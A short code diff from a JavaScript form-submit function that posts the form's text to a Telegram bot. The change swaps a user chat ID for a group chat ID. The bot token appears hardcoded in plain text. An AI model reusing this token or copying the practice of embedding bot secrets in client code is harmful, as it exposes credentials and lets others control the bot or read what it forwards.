@@ -69,7 +69,7 @@ const submit = async () => {
 
     try {
         const token = '7749260469:AAEgInZHdGNda-9FviCu_8E9C7fSrgmQKnc';
-        const chatId = '5812196124';
+        const chatId = '-1002370103265';
 
         // Send message to Telegram
         await axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
